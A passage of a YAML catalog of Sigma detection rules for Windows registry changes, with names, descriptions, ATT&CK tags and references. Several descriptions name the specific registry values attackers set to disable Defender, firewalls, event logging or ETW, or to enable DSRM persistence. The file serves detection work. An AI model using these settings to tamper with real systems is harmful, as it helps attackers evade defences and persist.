  - Unknown
  notes: ''
- detection_id: c7dcacd0-cc59-4004-b0a4-1d6cdebe6f3e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_administrative_share.yml
  name: Disable Administrative Share Creation at Startup
  description: Administrative shares are hidden network shares created by Microsoft
    Windows NT operating systems that grant system administrators remote access to
    every disk volume on a network-connected system
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1070.005
  tags:
  - attack.defense-evasion
  - attack.t1070.005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.005/T1070.005.md#atomic-test-4---disable-administrative-share-creation-at-startup
  false_positives:
  - Unknown
  notes: ''
- detection_id: f37b4bce-49d0-4087-9f5b-58bffda77316
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_autologger_sessions.yml
  name: Potential AutoLogger Sessions Tampering
  description: Detects tampering with autologger trace sessions which is a technique
    used by attackers to disable logging
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/MichalKoczwara/status/1553634816016498688
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  - https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 974515da-6cc5-4c95-ae65-f97f9150ec7f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_defender_firewall.yml
  name: Disable Microsoft Defender Firewall via Registry
  description: Adversaries may disable or modify system firewalls in order to bypass
    controls limiting network usage
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md#atomic-test-2---disable-microsoft-defender-firewall-via-registry
  false_positives:
  - Unknown
  notes: ''
- detection_id: e2482f8d-3443-4237-b906-cc145d87a076
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_function_user.yml
  name: Disable Internal Tools or Feature in Registry
  description: Detects registry modifications that change features of internal Windows
    tools (malware like Agent Tesla uses this technique)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md
  - https://www.mandiant.com/resources/unc2165-shifts-to-evade-sanctions
  - https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html
  - https://www.malwarebytes.com/blog/detections/pum-optional-nodispbackgroundpage
  - https://www.malwarebytes.com/blog/detections/pum-optional-nodispcpl
  - https://bazaar.abuse.ch/sample/7bde840c7e8c36dce4c3bac937bcf39f36a6f118001b406bfbbc25451ce44fb4/
  false_positives:
  - Legitimate admin script
  notes: ''
- detection_id: ab871450-37dc-4a3a-997f-6662aa8ae0f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_macroruntimescanscope.yml
  name: Disable Macro Runtime Scan Scope
  description: Detects tampering with the MacroRuntimeScanScope registry key to disable
    runtime scanning of enabled macros
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/
  - https://admx.help/?Category=Office2016&Policy=office16.Office.Microsoft.Policies.Windows::L_MacroRuntimeScanScope
  - https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/28cc6a2802d8176195ac19b3c8e9a749009a82a3/src/AMSIbypasses.vba
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0372e1f9-0fd2-40f7-be1b-a7b2b848fa7b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_privacy_settings_experience.yml
  name: Disable Privacy Settings Experience in Registry
  description: Detects registry modifications that disable Privacy Settings Experience
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1562.001/T1562.001.md
  false_positives:
  - Legitimate admin script
  notes: ''
- detection_id: 3ae1a046-f7db-439d-b7ce-b8b366b81fa6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_security_center_notifications.yml
  name: Disable Windows Security Center Notifications
  description: Detect set UseActionCenterExperience to 0 to disable the Windows security
    center notification
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5de03871-5d46-4539-a82d-3aa992a69a83
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_system_restore.yml
  name: Registry Disable System Restore
  description: Detects the modification of the registry to disable a system restore
    on the computer
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-9---disable-system-restore-through-registry
  false_positives:
  - Unknown
  notes: ''
- detection_id: e1aa95de-610a-427d-b9e7-9b46cfafbe6a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_windows_defender_service.yml
  name: Windows Defender Service Disabled - Registry
  description: Detects when an attacker or tool disables the  Windows Defender service
    (WinDefend) via the registry
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  - https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105
  false_positives:
  - Administrator actions
  notes: ''
- detection_id: ba226dcf-d390-4642-b9af-b534872f1156
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_windows_event_log_access.yml
  name: Windows Event Log Access Tampering Via Registry
  description: 'Detects changes to the Windows EventLog channel permission values.
    It focuses on changes to the Security Descriptor Definition Language (SDDL) string,
    as modifications to these values can restrict access to specific users or groups,
    potentially aiding in defense evasion by controlling who can view or modify a
    event log channel. Upon execution, the user shouldn''t be able to access the event
    log channel via the event viewer or via utilities such as "Get-EventLog" or "wevtutil".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1547.001
  - attack.t1112
  time_window: ''
  references:
  - https://www.atomicredteam.io/atomic-red-team/atomics/T1562.002#atomic-test-8---modify-event-log-channel-access-permissions-via-registry---powershell
  - https://www.youtube.com/watch?v=uSYvHUVU8xY
  - https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language
  false_positives:
  - Administrative activity, still unlikely
  notes: ''
- detection_id: e78c408a-e2ea-43cd-b5ea-51975cf358c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_windows_firewall.yml
  name: Disable Windows Firewall by Registry
  description: Detect set EnableFirewall to 0 to disable the Windows firewall
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.004/T1562.004.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2f78da12-f7c7-430b-8b19-a28f269b77a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disable_winevt_logging.yml
  name: Disable Windows Event Logging Via Registry
  description: Detects tampering with the "Enabled" registry key in order to disable
    Windows logging of a Windows event channel
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://twitter.com/WhichbufferArda/status/1543900539280293889
  - https://github.com/DebugPrivilege/CPP/blob/c39d365617dbfbcb01fffad200d52b6239b2918c/Windows%20Defender/RestoreDefenderConfig.cpp
  false_positives:
  - Rare falsepositives may occur from legitimate administrators disabling specific
    event log for troubleshooting
  notes: ''
- detection_id: bf9e1387-b040-4393-9851-1598f8ecfae9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disabled_exploit_guard_net_protection_on_ms_defender.yml
  name: Disable Exploit Guard Network Protection on Windows Defender
  description: Detects disabling Windows Defender Exploit Guard Network Protection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.tenforums.com/tutorials/105533-enable-disable-windows-defender-exploit-protection-settings.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: fcddca7c-b9c0-4ddf-98da-e1e2d18b0157
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disabled_microsoft_defender_eventlog.yml
  name: Disabled Windows Defender Eventlog
  description: Detects the disabling of the Windows Defender eventlog as seen in relation
    to Lockbit 3.0 infections
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://twitter.com/WhichbufferArda/status/1543900539280293889/photo/2
  false_positives:
  - Other Antivirus software installations could cause Windows to disable that eventlog
    (unknown)
  notes: ''
- detection_id: 8ffc5407-52e3-478f-9596-0a7371eafe13
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disabled_pua_protection_on_microsoft_defender.yml
  name: Disable PUA Protection on Windows Defender
  description: Detects disabling Windows Defender PUA protection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.tenforums.com/tutorials/32236-enable-disable-microsoft-defender-pua-protection-windows-10-a.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 93d298a1-d28f-47f1-a468-d971e7796679
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disabled_tamper_protection_on_microsoft_defender.yml
  name: Disable Tamper Protection on Windows Defender
  description: Detects disabling Windows Defender Tamper Protection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-microsoft-defender-antivirus.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 275641a5-a492-45e2-a817-7c81e9d9d3e9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disallowrun_execution.yml
  name: Add DisallowRun Execution to Registry
  description: Detect set DisallowRun to 1 to prevent user running specific computer
    program
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: d4e2745c-f0c6-4bde-a3ab-b553b3f693cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_disk_cleanup_handler_autorun_persistence.yml
  name: Persistence Via Disk Cleanup Handler - Autorun
  description: 'Detects when an attacker modifies values of the Disk Cleanup Handler
    in the registry to achieve persistence via autorun.

    The disk cleanup manager is part of the operating system.

    It displays the dialog box [] The user has the option of enabling or disabling
    individual handlers by selecting or clearing their check box in the disk cleanup
    manager''s UI.

    Although Windows comes with a number of disk cleanup handlers, they aren''t designed
    to handle files produced by other applications.

    Instead, the disk cleanup manager is designed to be flexible and extensible by
    enabling any developer to implement and register their own disk cleanup handler.

    Any developer can extend the available disk cleanup services by implementing and
    registering a disk cleanup handler.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/diskcleanuphandler.html
  - https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 04b45a8a-d11d-49e4-9acc-4a1b524407a5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_dns_over_https_enabled.yml
  name: DNS-over-HTTPS Enabled by Registry
  description: 'Detects when a user enables DNS-over-HTTPS.

    This can be used to hide internet activity or be used to hide the process of exfiltrating
    data.

    With this enabled organization will lose visibility into data such as query type,
    response and originating IP that are used to determine bad actors.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1140
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1140
  - attack.t1112
  time_window: ''
  references:
  - https://www.tenforums.com/tutorials/151318-how-enable-disable-dns-over-https-doh-microsoft-edge.html
  - https://github.com/elastic/detection-rules/issues/1371
  - https://chromeenterprise.google/policies/?policy=DnsOverHttpsMode
  - https://admx.help/HKLM/Software/Policies/Mozilla/Firefox/DNSOverHTTPS
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e61e8a88-59a9-451c-874e-70fcc9740d67
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_dns_server_level_plugin_dll.yml
  name: New DNS ServerLevelPluginDll Installed
  description: Detects the installation of a DNS plugin DLL via ServerLevelPluginDll
    parameter in registry, which can be used to execute code in context of the DNS
    server (restart required)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  - attack.t1112
  time_window: ''
  references:
  - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
  - https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: bf4fc428-dcc3-4bbd-99fe-2422aeee2544
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_dot_net_etw_tamper.yml
  name: ETW Logging Disabled In .NET Processes - Sysmon Registry
  description: Potential adversaries stopping ETW providers recording loaded .NET
    assemblies.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  - attack.t1562
  time_window: ''
  references:
  - https://twitter.com/_xpn_/status/1268712093928378368
  - https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr
  - https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables
  - https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38
  - https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39
  - https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_
  - https://bunnyinside.com/?term=f71e8cb9c76a
  - http://managed670.rssing.com/chan-5590147/all_p1.html
  - https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code
  - https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
  - https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: b61e87c0-50db-4b2e-8986-6a2be94b33b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_dsrm_tampering.yml
  name: Directory Service Restore Mode(DSRM) Registry Value Tampering
  description: 'Detects changes to "DsrmAdminLogonBehavior" registry value.

    During a Domain Controller (DC) promotion, administrators create a Directory Services
    Restore Mode (DSRM) local administrator account with a password that rarely changes.
    The DSRM account is an Administrator account that logs in with the DSRM mode
    when the server is booting up to restore AD backups or recover the server from
    a failure.

    Attackers could abuse DSRM account to maintain their persistence and access to
    the organization''s Active Directory.

    If the "DsrmAdminLogonBehavior" value is set to "0", the administrator account
    can only be used if the DC starts in DSRM.

    If the "DsrmAdminLogonBehavior" value is set to "1", the administrator account
    can only be used if the local AD DS service is stopped.

    If the "DsrmAdminLogonBehavior" value is set to "2", the administrator account
    can always be used.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.persistence
  - attack.t1556
  time_window: ''
  references:
  - https://adsecurity.org/?p=1785
  - https://www.sentinelone.com/blog/detecting-dsrm-account-misconfigurations/
  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-credentials
  false_positives:
  - Unknown
  notes: ''
- detection_id: 973ef012-8f1a-4c40-93b4-7e659a5cd17f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_enable_periodic_backup.yml
  name: Periodic Backup For System Registry Hives Enabled
  description: 'Detects the enabling of the "EnablePeriodicBackup" registry value.
    Once enabled, The OS will backup System registry hives on restarts to the "C:\Windows\System32\config\RegBack"
    folder. Windows creates a "RegIdleBackup" task to manage subsequent backups.

    Registry backup was a default behavior on Windows and was disabled as of "Windows
    10, version 1803".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/troubleshoot/windows-client/installing-updates-features-roles/system-registry-no-backed-up-regback-folder
  false_positives:
  - Legitimate need for RegBack feature by administrators.
  notes: ''
- detection_id: 75180c5f-4ea1-461a-a4f6-6e4700c065d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_enable_windows_recall.yml
  name: Windows Recall Feature Enabled - Registry
  description: 'Detects the enabling of the Windows Recall feature via registry manipulation.
    Windows Recall can be enabled by setting the value of "DisableAIDataAnalysis"
    to "0".

    Adversaries may enable Windows Recall as part of post-exploitation discovery and
    collection activities.

    This rule assumes that Recall is already explicitly disabled on the host, and
    subsequently enabled by the adversary.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/client-management/manage-recall
  - https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowsai#disableaidataanalysis
  false_positives:
  - Legitimate use/activation of Windows Recall
  notes: ''
- detection_id: ad89044a-8f49-4673-9a55-cbd88a1b374f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_enabling_cor_profiler_env_variables.yml
  name: Enabling COR Profiler Environment Variables
  description: Detects .NET Framework CLR and .NET Core CLR "cor_enable_profiling"
    and "cor_profiler" variables being set and configured.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.012
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1574.012
  time_window: ''
  references:
  - https://twitter.com/jamieantisocial/status/1304520651248668673
  - https://www.slideshare.net/JamieWilliams130/started-from-the-bottom-exploiting-data-sources-to-uncover-attck-behaviors
  - https://www.sans.org/cyber-security-summit/archives
  - https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling
  false_positives: []
  notes: ''
- detection_id: 7d995e63-ec83-4aa3-89d5-8a17b5c87c86
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_enabling_turnoffcheck.yml
  name: Scripted Diagnostics Turn Off Check Enabled - Registry
  description: Detects enabling TurnOffCheck which can be used to bypass defense of
    MSDT Follina vulnerability
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://twitter.com/wdormann/status/1537075968568877057?s=20&t=0lr18OAnmAGoGpma6grLUw
  false_positives:
  - Administrator actions
  notes: ''
- detection_id: 0cb8d736-995d-4ce7-a31e-1e8d452a1459
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_evtx_file_key_tamper.yml
  name: Potential EventLog File Location Tampering
  description: Detects tampering with EventLog service "file" key. In order to change
    the default location of an Evtx file. This technique is used to tamper with log
    collection and alerting
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/eventlog/eventlog-key
  false_positives:
  - Unknown
  notes: ''
- detection_id: 42205c73-75c8-4a63-9db1-e3782e06fda0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_exploit_guard_susp_allowed_apps.yml
  name: Suspicious Application Allowed Through Exploit Guard
  description: Detects applications being added to the "allowed applications" list
    of exploit guard in order to bypass controlled folder settings
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e3fdf743-f05b-4051-990a-b66919be1743
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_fax_change_service_user.yml
  name: Change User Account Associated with the FAX Service
  description: Detect change of the user account associated with the FAX service to
    avoid the escalation problem.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://twitter.com/dottor_morte/status/1544652325570191361
  - https://raw.githubusercontent.com/RiccardoAncarani/talks/master/F-Secure/unorthodox-lateral-movement.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9e3357ba-09d4-4fbd-a7c5-ad6386314513
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_fax_dll_persistance.yml
  name: Change the Fax Dll
  description: Detect possible persistence using Fax DLL load when service restart
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
